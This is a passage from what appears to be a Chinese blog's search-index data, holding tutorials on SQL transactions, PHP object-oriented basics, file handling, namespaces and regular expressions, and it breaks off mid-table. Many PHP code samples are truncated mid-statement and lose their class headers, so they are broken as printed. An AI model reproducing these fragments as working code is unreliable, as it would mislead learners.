+500UPDATE account set money = money + 500 where name = &#x27;张三&#x27;;-- 提交事务COMMIT;-- 回滚事务ROLLBACK;-- 查看事务的默认提交方式SELECT @@autocommit;-- 1 自动提交 0 手动提交-- 修改事务提交方式set @@autocommit = 0; 事务的四大特征原子性（Atomicity）: 事务是不可分割的最小操作单位，要么同时成功，要么同时失败 一致性（Consistency） :事务完成时，必须使所有的数据都保持一致状态 隔离性（Isolation） :多个事务之间，操作的可见性 持久性（Durability） :事务一旦提交或回滚，它对数据库中的数据的改变就是永久的","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"SQL","slug":"开发/SQL","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"PHP基础","slug":"php基础","date":"2024-01-13T05:52:14.954Z","updated":"2024-01-13T06:25:22.745Z","comments":true,"path":"2024/01/13/php基础/","permalink":"http://example.com/2024/01/13/php%E5%9F%BA%E7%A1%80/","excerpt":"","text":"PHP简述PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。 在一个php文件中可以包括以下内容： PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码 PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器 PHP 文件的默认文件扩展名是 “.php” php的使用： PHP 可以生成动态页面内容 PHP 可以创建、打开、读取、写入、关闭服务器上的文件 PHP 可以收集表单数据 PHP 可以发送和接收 cookies PHP 可以添加、删除、修改您的数据库中的数据 PHP 可以限制用户访问您的网站上的一些页面 PHP 可以加密数据 基本语法格式PHP 脚本以 结束 变量 $this 代表自身的对象。 PHP_EOL 为换行符。 PHP 中创建对象 类创建后，我们可以使用 new 运算符来实例化该类的对象： $w3cschool &#x3D; new Site; $taobao &#x3D; new Site; $google &#x3D; new Site; 以上代码我们创建了三个对象，三个对象各自都是独立的，接下来我们来看看如何访问成员方法与成员变量。 调用成员方法 在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量： &#x2F;&#x2F; 调用成员函数，设置标题和URL $w3cschool-&gt;setTitle( “W3Cschool教程” ); $taobao-&gt;setTitle( “淘宝” ); $google-&gt;setTitle( “Google 搜索” ); $w3cschool-&gt;setUrl( ‘www.w3cschool.cn‘ ); $taobao-&gt;setUrl( ‘www.taobao.com‘ ); $google-&gt;setUrl( ‘www.google.com‘ ); &#x2F;&#x2F; 调用成员函数，获取标题和URL $w3cschool-&gt;getTitle(); $taobao-&gt;getTitle(); $google-&gt;getTitle(); $w3cschool-&gt;getUrl(); $taobao-&gt;getUrl(); $google-&gt;getUrl(); 完整代码如下： url = $par; ` `} ` `function getUrl (){ ` `echo $this->url . PHP\\_EOL ; ` `} ` `function setTitle($par){ ` `$this ->title = $par; ` `} ` `function getTitle (){ ` `echo $this->title . PHP\\_EOL ; ` `} } $w3cschool = new Site; $taobao = new Site; $google = new Site; // 调用成员函数，设置标题和URL $w3cschool->setTitle( \"W3Cschool教程\" ); $taobao ->setTitle( \"淘宝\" ); $google-> setTitle( \"Google 搜索\" ); $w3cschool-> setUrl( 'www.w3cschool.cn' ); $taobao->setUrl ( 'www.taobao.com' ); $google->setUrl( 'www.google.com' ); // 调用成员函数，获取标题和URL $w3cschool->getTitle (); $taobao->getTitle(); $google-> getTitle(); $w3cschool->getUrl(); $taobao ->getUrl(); $google->getUrl(); ?> 执行以上代码，输出结果为： W3Cschool教程 淘宝 Google 搜索 www.w3cschool.cn www.taobao.com www.google.com PHP 构造函数 构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。 PHP 5 允行开发者在一个类中定义一个方法作为构造函数，语法格式如下： void __construct ([ mixed $args [, $… ]] ) 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量： function __construct( $par1, $par2 ) { $this-&gt;url &#x3D; $par1; $this-&gt;title &#x3D; $par2; } 现在我们就不需要再调用 setTitle 和 setUrl 方法了： $youj &#x3D; new Site(‘www.w3cschool.cn‘, ‘W3Cschool教程’); $taobao &#x3D; new Site(‘www.taobao.com‘, ‘淘宝’); $google &#x3D; new Site(‘www.google.com‘, ‘Google 搜索’); &#x2F;&#x2F; 调用成员函数，获取标题和URL $youj-&gt;getTitle(); $taobao-&gt;getTitle(); $google-&gt;getTitle(); $youj-&gt;getUrl(); $taobao-&gt;getUrl(); $google-&gt;getUrl(); 析构函数 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。 PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，其语法格式如下： void __destruct ( void ) 实例 name = \"MyDestructableClass\"; ` `} ` `function \\_\\_destruct() { ` `print \"销毁 \" . $this->name . \"\\n\"; ` `} } $obj = new MyDestructableClass(); ?> 执行以上代码，输出结果为： 构造函数 销毁 MyDestructableClass 继承 继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为。 父类&#x3D;基类 PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式 class Child extends Parent { &#x2F;&#x2F; 代码部分 }如下： 实例 实例中 Child_Site 类继承了 Site 类，并扩展了功能： category = $par; ` `} ` `function getCate(){ ` `echo $this->category . PHP\\_EOL; ` `} } **方法重写** 如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。 实例中重写了 getUrl 与 getTitle 方法： function getUrl() { ` `echo $this->url . PHP\\_EOL; ` `return $this->url; } function getTitle(){ ` `echo $this->title . PHP\\_EOL; ` `return $this->title; } **访问控制** PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），**protected**（受保护）或 **private**（私有）来实现的。 **public**（公有）：公有的类成员可以在任何地方被访问。 **protected**（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。 **private**（私有）：私有的类成员则只能被其定义所在的类访问。 **属性的访问控制** 类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。 public; ` `echo $this->protected; ` `echo $this->private; ` `} } $obj = new MyClass(); echo $obj->public; // 这行能被正常执行 echo $obj->protected; // 这行会产生一个致命错误 echo $obj->private; // 这行也会产生一个致命错误 $obj->printHello(); // 输出 Public、Protected 和 Private /\\*\\* ` `\\* Define MyClass2 ` `\\*/ class MyClass2 extends MyClass { ` `// 可以对 public 和 protected 进行重定义，但 private 而不能 ` `protected $protected = 'Protected2'; ` `function printHello() ` `{ ` `echo $this->public; ` `echo $this->protected; ` `echo $this->private; ` `} } $obj2 = new MyClass2(); echo $obj2->public; // 这行能被正常执行 echo $obj2->private; // 未定义 private echo $obj2->protected; // 这行会产生一个致命错误 $obj2->printHello(); // 输出 Public、Protected2 和 Undefined ?> 方法的访问控制 类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方公有 MyPublic(); ` `$this->MyProtected(); ` `$this->MyPrivate(); ` `} } $myclass = new MyClass; $myclass->MyPublic(); // 这行能被正常执行 $myclass->MyProtected(); // 这行会产生一个致命错误 $myclass->MyPrivate(); // 这行会产生一个致命错误 $myclass->Foo(); // 公有，受保护，私有都可以执行 /\\*\\* ` `\\* Define MyClass2 ` `\\*/ class MyClass2 extends MyClass { ` `// 此方法为公有 ` `function Foo2() ` `{ ` `$this->MyPublic(); ` `$this->MyProtected(); ` `$this->MyPrivate(); // 这行会产生一个致命错误 ` `} } $myclass2 = new MyClass2; $myclass2->MyPublic(); // 这行能被正常执行 $myclass2->Foo2(); // 公有的和受保护的都可执行，但私有的不行 class Bar { ` `public function test() { ` `$this->testPrivate(); ` `$this->testPublic(); ` `} ` `public function testPublic() { ` `echo \"Bar::testPublic\\n\"; ` `} ` `private function testPrivate() { ` `echo \"Bar::testPrivate\\n\"; ` `} } class Foo extends Bar { ` `public function testPublic() { ` `echo \"Foo::testPublic\\n\"; ` `} ` `private function testPrivate() { ` `echo \"Foo::testPrivate\\n\"; ` `} } $myFoo = new foo(); $myFoo->test(); // Bar::testPrivate ` `// Foo::testPublic ?> 接口 使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。 接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。 接口中定义的所有方法都必须是公有，这是接口的特性。 要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。 vars[$name] = $var; ` `} ` `public function getHtml($template) ` `{ ` `foreach($this->vars as $name => $value) { ` `$template = str\\_replace('{' . $name . '}', $value, $template); ` `} ` `return $template; ` `} } **常量** 可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。 常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。 自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。 实例 showConstant(); echo $class::constant . PHP\\_EOL; // 自 PHP 5.3.0 起 ?> 抽象类 任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。 定义为抽象的类不能被实例化。 被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。 继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。 getValue() . PHP\\_EOL; ` `} } class ConcreteClass1 extends AbstractClass { ` `protected function getValue() { ` `return \"ConcreteClass1\"; ` `} ` `public function prefixValue($prefix) { ` `return \"{$prefix}ConcreteClass1\"; ` `} } class ConcreteClass2 extends AbstractClass { ` `public function getValue() { ` `return \"ConcreteClass2\"; ` `} ` `public function prefixValue($prefix) { ` `return \"{$prefix}ConcreteClass2\"; ` `} } $class1 = new ConcreteClass1; $class1->printOut(); echo $class1->prefixValue('FOO\\_') . PHP\\_EOL; $class2 = new ConcreteClass2; $class2->printOut(); echo $class2->prefixValue('FOO\\_') . PHP\\_EOL; ?> 执行以上代码，输出结果为： ConcreteClass1 FOO_ConcreteClass1 ConcreteClass2 FOO_ConcreteClass2 此外，子类方法可以包含父类抽象方法中不存在的可选参数。例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则都是可以正常运行的。 prefixName(\"Pacman\"), \"\\n\"; echo $class->prefixName(\"Pacwoman\"), \"\\n\"; ?> 输出结果为： Mr. Pacman Mrs. Pacwoman 接口与抽象类 1. 接口 （1）对接口的使用是通过关键字implements （2）接口不能定义成员变量（包括类静态变量），能定义常量 （3）子类必须实现接口定义的所有方法 （4）接口只能定义不能实现该方法 （5）接口没有构造函数 （6）接口中的方法和实现它的类默认都是public类型的 2. 抽象类 （1）对抽象类的使用是通过关键字extends （2）不能被实例化，可以定义子类必须实现的方法 （3）子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松） （4）如一个类中有一个抽象方法，则该类必须定义为抽象类 （5）抽象类可以有构造函数 （6）抽象类中的方法可以使用private,protected,public来修饰。 （7）一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。 Static 关键字 声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。 静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。 由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。 静态属性不可以由对象通过 -&gt; 操作符来访问。 自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。 staticValue() . PHP\\_EOL; ?> 执行以上程序，输出结果为： foo Foo Final 关键字 PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。 以下代码执行会报错： 调用父类构造方法 PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() 。 执行以上程序，输出结果为： BaseClass 类中构造方法 BaseClass 类中构造方法 SubClass 类中构造方法 BaseClass 类中构造方法 PHP超级全局变量 PHP超级全局变量列表： $GLOBALS 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 $_SERVER 一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组 $_REQUEST 用于收集HTML表单提交的数据。 它可以获取 cookie get post $_POST 广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”。 $_GET 广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”。 Array [] $_FILES $_ENV $_COOKIE $_SESSION PHP Include 文件服务器端包含 (SSI) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。 include （或 require）语句会获取指定文件中存在的所有文本&#x2F;代码&#x2F;标记，并复制到使用 include 语句的文件中。 包含文件很有用，如果您需要在网站的多张页面上引用相同的 PHP、HTML 或文本的话。 PHP include 和 require 语句 通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。 include 和 require 语句是相同的，除了错误处理方面： require 会生成致命错误（E_COMPILE_ERROR）并停止脚本 include 只生成警告（E_WARNING），并且脚本会继续 因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。 包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。 语法 include ‘filename’; 或 require ‘filename’; PHP 文件处理PHP 操作文件PHP 拥有的多种函数可供创建、读取、上传以及编辑文件。 注意：请谨慎操作文件！ 当您操作文件时必须非常小心。如果您操作失误，可能会造成非常严重的破坏。常见的错误是： 编辑错误的文件 被垃圾数据填满硬盘 意外删除文件内容 PHP readfile() 函数 readfile() 函数读取文件，并把它写入输出缓冲。 假设我们有一个名为 “webdictionary.txt” 的文本文件，存放在服务器上，就像这样： AJAX &#x3D; Asynchronous JavaScript and XML CSS &#x3D; Cascading Style Sheets HTML &#x3D; Hyper Text Markup Language PHP &#x3D; PHP Hypertext Preprocessor SQL &#x3D; Structured Query Language SVG &#x3D; Scalable Vector Graphics XML &#x3D; EXtensible Markup Language 读取此文件并写到输出流的 PHP 代码如下（如读取成功则 readfile() 函数返回字节数）： 实例 PHP 文件打开&#x2F;读取&#x2F;关闭在本节中，我们向您讲解如何在服务器上打开、读取以及关闭文件。 PHP Open File - fopen() 打开文件的更好的方法是通过 fopen() 函数。此函数为您提供比 readfile() 函数更多的选项。 在课程中，我们将使用文本文件 “webdictionary.txt”： AJAX &#x3D; Asynchronous JavaScript and XML CSS &#x3D; Cascading Style Sheets HTML &#x3D; Hyper Text Markup Language PHP &#x3D; PHP Hypertext Preprocessor SQL &#x3D; Structured Query Language SVG &#x3D; Scalable Vector Graphics XML &#x3D; EXtensible Markup Language fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。如果 fopen() 函数未能打开指定的文件，下面的例子会生成一段消息： 实例 提示：我们接下来将学习 fread() 以及 fclose() 函数。 文件会以如下模式之一打开： PHP 读取文件 - fread() fread() 函数读取打开的文件。 fread() 的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数。 如下 PHP 代码把 “webdictionary.txt” 文件读至结尾： fread($myfile,filesize(“webdictionary.txt”)); PHP 关闭文件 - fclose() fclose() 函数用于关闭打开的文件。 注释：用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。 fclose() 需要待关闭文件的名称（或者存有文件名的变量）： PHP 读取单行文件 - fgets() fgets() 函数用于从文件读取单行。 下例输出 “webdictionary.txt” 文件的首行： 实例 运行实例 注释：调用 fgets() 函数之后，文件指针会移动到下一行。 PHP 检查 End-Of-File - feof() feof() 函数检查是否已到达 “end-of-file” (EOF)。 feof() 对于遍历未知长度的数据很有用。 feof() 函数检查是否已到达文件末尾(EOF) 下例逐行读取 “webdictionary.txt” 文件，直到 end-of-file： 实例 运行实例 PHP 读取单字符 - fgetc() fgetc() 函数用于从文件中读取单个字符。 下例逐字符读取 “webdictionary.txt” 文件，直到 end-of-file： 实例 运行实例 注释：在调用 fgetc() 函数之后，文件指针会移动到下一个字符。 在本节中，我们将为您讲解如何在服务器上创建并写入文件。 PHP 创建文件 - fopen() fopen() 函数也用于创建文件。也许有点混乱，但是在 PHP 中，创建文件所用的函数与打开文件的相同。 如果您用 fopen() 打开并不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。 下面的例子创建名为 “testfile.txt” 的新文件。此文件将被创建于 PHP 代码所在的相同目录中： 实例 $myfile &#x3D; fopen(“testfile.txt”, “w”) PHP 文件权限 如果您试图运行这段代码时发生错误，请检查您是否有向硬盘写入信息的 PHP 文件访问权限。 PHP 写入文件 - fwrite() fwrite() 函数用于写入文件。 fwrite() 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。 下面的例子把姓名写入名为 “newfile.txt” 的新文件中： 实例 请注意，我们向文件 “newfile.txt” 写了两次。在每次我们向文件写入时，在我们发送的字符串 $txt 中，第一次包含 “Bill Gates”，第二次包含 “Steve Jobs”。在写入完成后，我们使用 fclose() 函数来关闭文件。 如果我们打开 “newfile.txt” 文件，它应该是这样的： Bill Gates Steve Jobs PHP 覆盖（Overwriting） 如果现在 “newfile.txt” 包含了一些数据，我们可以展示在写入已有文件时发生的的事情。所有已存在的数据会被擦除并以一个新文件开始。 在下面的例子中，我们打开一个已存在的文件 “newfile.txt”，并向其中写入了一些新数据： 实例 如果现在我们打开这个 “newfile.txt” 文件，Bill 和 Steve 都已消失，只剩下我们刚写入的数据： Mickey Mouse Minnie Mouse 文件的 复制 删除 重名php文件重命名：函数rename()。 php文件复制：函数copy(); php文件删除：函数unlink(); 文件的判断file_exists() 判断文件是否存在 is_file() 是否为文件。 PHP获取文件属性当我们在程序中操作文件时，可能会使用到文件的一些常见属性，比如文件的大小、类型、修改时间、访问时间以及权限等等。PHP 中提供了非常全面的用来获取这些属性的内置函数，如下表所示。 PHP目录操作目录操作 新建目录：mkdir(路径，权限，递归创建) 删除目录：rmdir() 移动（改名）：rename() 获取目录内容： &#x2F;&#x2F;打开目录 目录句柄 &#x3D; opendir() &#x2F;&#x2F;读取目录 文件名 &#x3D; readdir(目录句柄) 依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false &#x2F;&#x2F;关闭目录 closedir() 当前目录. 上级目录用.. 递归读取目录内容： 命名空间PHP 命名空间可以解决以下两类问题： 1.用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。 2.为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，以提高源代码的可读性。 命名空间（可以理解为创建文件夹） 定义：命名空间namespace，是指人为的将内存进行分隔，让不同内存区域的同名结构共存，从而解决在大型项目中可能出现的重名结构的问题 语法：namespace 空间名 作用：不同的空间可以有同名的结构，如：类 空间元素：函数，常量，类，不包括变量！！ 子空间（子文件夹） 定义：命名空间内部再划分一个命名空间，让每个小空间独立起来 语法: namespace 空间名 namespace 空间名\\子空间 命名空间访问 （url） 非限定名称访问：直接访问空间元素的名字（只访问自己命名空间的元素） 限定名称访问：使用自己当前的子空间名字+ \\ + 元素名字 完全限定名称访问：\\ + 全局空间 + \\ + 元素名字 注：任何空间元素访问，只针对函数，类，常量 全局空间（C盘） 如果定义了命名空间，非限定名称的寻找系统常量的方式： 首先：在自己的空间内找 然后：如果找不到元素 系统常量–&gt;进入全局空间寻找 系统类 –&gt; 不会自动进入全局空间寻找，而是会报错 命名空间的引入 1.空间引入方式：use关键字 1. 引入类：use 空间名\\类名 2. 引入函数：use function 空间名\\函数名 3. 引入常量：use const 空间名\\常量名 2.当引入元素时重名，通过 as 来起别名 use 空间名\\类名 as 别名 3.引入多个元素 use 空间名{ 类名， function 函数名， const 常量 } 4. 引入空间 use 空间名 正则表达式正则表达式简介 正则表达式是用于描述字符排列和匹配模式的一种语法规则。它主要用于字符串的模式分割、匹配、查找及替换操作。到目前为止，我们前面所用过的精确（文本）匹配也是一种正则表达式。 在PHP中，正则表达式一般是由正规字符和一些特殊字符（类似于通配符）联合构成的一个文本模式的程序性描述。 正则表达式较重要和较有用的角色是验证用户数据的有效性检查。PHP中，正则表达式有三个作用： 匹配，也常常用于从字符串中析取信息。 用新文本代替匹配文本。 将一个字符串拆分为一组更小的信息块。 正则表达式的基本语法 PCRE库函数中，正则匹配模式使用分隔符与元字符组成，分隔符可以是非数字、非反斜线、非空格的任意字符。经常使用的分隔符是正斜线(&#x2F;)、hash符号(#) 以及取反符号(~) 元字符是用于构造规则表达式的具有特殊含义的字符。如果要在正则表达式中包含元字符本身，必须在其前加上”\\”进行转义 元字符 说明 * 0次、1次或多次匹配其前的原子 + 1次或多次匹配其前的原子 ? 0次或1次匹配其前的原子 | 匹配两个或多个选择 ^ 匹配字符串串首的原子 $ 匹配字符串串尾的原子 [] 匹配方括号中的任一原子 [^] 匹配除方括号中的原子外的任何字符 {m} 表示其前原子恰好出现m次 {m,n} 表示其前原子至少出现m次，至少出现n次(n&gt;m) {m,} 表示其前原子出现不少于m次 () 整体表示一个原子 . 匹配除换行之外的任何一个字符 边界限制 在某些情况下，需要对匹配范围进行限定，以获得更准确的匹配结果。“^”和“$”分别指定字符串的开始和结束。 例如，在字符串“Tom and Jerry chased each other in the house until tom’s uncel come in”中 元字符“^” 置于字符串的开始确保模式匹配出现在字符串首端； ^Tom 元字符“$” 置于字符串的结束，确保模式匹配出现字符串尾端。 in$ 如果不加边界限制元字符，将获得更多的匹配结果。 ^Tom$精确匹配 Tom模糊匹配 重复匹配 正则表达式中有一些用于重复匹配某些原子的元字符：“?”、“*”、“+”。他们主要的不同是重复匹配的次数不同。 元字符“?”:表示0次或1次匹配紧接在其前的原子。 例如：colou?r匹配“colour”或“color”。 元字符“*”:表示0次、1次或多次匹配紧接在其前的原子。 例如：zo*可以匹配z、zoo &lt;[A-Za-z][A-Za-z0-9]*&gt;可以匹配“”、“”或“”等HTML标签，并且不严格的控制大小写。 元字符“+”:表示1次或多次匹配紧接在其前的原子。 例如：go+gle匹配“gogle”、“google”或“gooogle”等中间含有多个o的字符串。 例子十六进制数字，匹配表达式是0?[ xX][0-9a-fA-F]+,可以匹配“0x9B3C”或者“X800”等。 元字符 “.” 元字符“.”匹配除换行符外任何一个字符，相当于^\\n或^\\r\\n。 例如：pr.y可以匹配的字符串“prey”、“pray”或“pr%y”等。 通常可以使用“.*”组合来匹配除换行符外的任何字符。在一些书籍中也称其为“全匹配符” 或 “单含匹配符”。 例如： ^a.*z$表示可以匹配字母“a”开头，字母“z”结束的任意不包括换行符的字符串。 .+也可以完成类似的匹配功能所不同的是其至少匹配一个字符。 ^a.+z$将不匹配字符串“az”。 重复匹配 元字符“{}”准确地指定原子重复的次数，指定所匹配的原子出现的次数。 “{m}”表示其前原子恰好出现m次； “{m，n}”表示其前原子至少出现m次，至多出现n次； “{m，}”表示其前原子出现不少于m次。 例如： zo{1,3}m只能匹配字符串“zom”、“zoom”、或“zooom”。 zo{3}m只能匹配字符串“zooom” zo{3，}m可以匹配以 “z” 开头，“m”结束，中间至少为3个“o”的字符串。 bo{0,1}u可以匹配字符串“bought a butter” 中的“bou”和“bu”,等价于bo?u。 原子表 －方括号表达式 原子表”[]”中存放一组原子，彼此地位平等，且仅匹配其中的一个原子。如果想匹配一个 ”a” 或 ”e” 使用 [ae]。 例如: Pr[ae]y 匹配 ”Pray” 或者 ”Prey ”。 原子表 ”[^]” 或者称为排除原子表，匹配除表内原子外的任意一个字符。 例如：p[^u]匹配“part”中的“pa”，但无法匹配“computer”中的“pu”因为“u”在匹配中被排除。 原子表“[-]”用于连接一组按ASCII码顺序排列的原子，简化书写。 例如：x[0123456789]可以写成x[0-9],用来匹配一个由 “x” 字母与一个数字组成的字符串。 例如： [a-zA-Z]匹配所有大小写字母 ^[a-z][0-9]$匹配比如“z2”、 “t6” 、“g7” 0[xX][0-9a-fA-F]匹配一个简单的十六进制数字，如“0x9”。 [^0-9a-zA-Z_]匹配除英文字母、数字和下划线以外任何一个字符，其等价于\\W。 模式选择符 元字符“|”又称模式选择符。在正则表达式中匹配两个或更多的选择之一。 例如：在字符串“There are many apples and pears.”中，apple|pear在第一次运行时匹配“apple”；再次运行时匹配“ pear”。也可以继续增加选项，如： apple|pear|banana|lemon POSIX风格预定义的正则表达式的字符类： [[:alnum:]] 字母和数字字符 [[:alpha:]] 大小写字母 [[:lower:]] 小写字母 [[:upper:]] 大写字母 [[:digit:]] 数字0-9 [[:xdigit:]] 十六进制数字 [[:punct:]] 标点符号，包括上档键!@ [[:blank:]] TAB制表符和空格 [[:space:]] 任何空白字符,换行,回车符 [[:cntrl:]] 控制字符（TAB，退格） 模式单元 元字符“（）”将其中的正则表达式变为原子（或称模式单元）使用。与数学表达式中的括号类似，“（）”可以做一个单元被单独使用。 例如： (Dog)+匹配的“Dog”、“DogDog”、“DogDogDog”……..,因为紧接着“+”前的原子是元字符“（）”括起来的字符串“Dog”。 You (very)+ old匹配“You very old”、 “You very very old” Hello (world|earth)匹配“Hello world”、“Hello earth” 一个模式单元中的表达式将被优先匹配或运算 特殊字符 所谓特殊字符，就是一些有特殊含义的字符，如上面说的”*.txt”中的*，简单的说就是表示任何字符串的意思。如果要查找文件名中有＊的文件，则需要对＊进行转义，即在其前加一个\\。ls \\*.txt。正则表达式有以下特殊字符。 模式匹配的顺序 在使用正则表达式时，需要注意匹配的顺序。通常，正则表达式按照由左至右的顺序依次匹配。 模式匹配的顺序（从高到低） 顺序 元字符 说明 1 （） 模式单元 2 ？* +{} 重复匹配 3 ^$ 边界限制 4 | 模式选择 元字符表 字符 描述 \\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\\n’ 匹配一个换行符。序列 ‘\\’ 匹配 “\\” 而 “(” 则匹配 “(”。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\\n’ 或 ‘\\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\\n’ 或 ‘\\r’ 之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 ? 当 该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。 . 匹配除 “\\n” 之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用象 ‘[.\\n]’ 的模式。 (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘′或‘’。 (?:pattern) 匹 配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。 (?&#x3D;pattern) 正 向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?&#x3D;95|98|NT|2000)’ 能匹配 “Windows 2000″ 中的 “Windows” ，但不能匹配 “Windows 3.1″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 负 向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95|98|NT|2000)’ 能匹配 “Windows 3.1″ 中的 “Windows”，但不能匹配 “Windows 2000″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始 x|y 匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 